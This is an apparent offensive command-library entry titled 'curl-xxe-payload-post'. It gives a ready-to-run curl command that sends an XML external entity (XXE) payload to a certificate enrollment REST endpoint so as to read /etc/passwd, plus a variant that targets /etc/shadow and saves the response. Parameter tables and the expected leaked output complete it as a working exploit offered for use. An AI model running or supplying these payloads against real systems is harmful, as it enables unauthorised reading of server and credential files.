---
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><CertEnrollmentRequest><ProfileID>&xxe;</ProfileID></CertEnrollmentRequest>'
  https://target.com/ca/rest/certrequests
tags:
  - xxe
  - http-post
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 1d88fc6e-3124-43e8-9df7-b14345ac6ac7
created_at: '2025-12-13T09:00:27.801Z'
updated_at: '2025-12-13T09:00:27.801Z'
verified: false
validated: true
submitted: true
---
# curl-xxe-payload-post

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><CertEnrollmentRequest><ProfileID>&xxe;</ProfileID></CertEnrollmentRequest>' https://target.com/ca/rest/certrequests
```

## Description

This command uses curl to send a POST request with a malicious XML payload exploiting XXE to read arbitrary files like /etc/passwd on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-d 'xml_payload'` | The malicious XML data | Yes |
| `https://target.com/ca/rest/certrequests` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><CertEnrollmentRequest><ProfileID>&xxe;</ProfileID></CertEnrollmentRequest>' https://target.com/ca/rest/certrequests
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><CertEnrollmentRequest><ProfileID>&xxe;</ProfileID></CertEnrollmentRequest>' https://target.com/ca/rest/certrequests -o response.xml
```

## Expected Output

A 400 Bad Request response with XML error message containing the leaked file contents, e.g., embedded /etc/passwd lines.

## Related

- [[procedures/XXE-Injection-to-Read-Server-Files]]
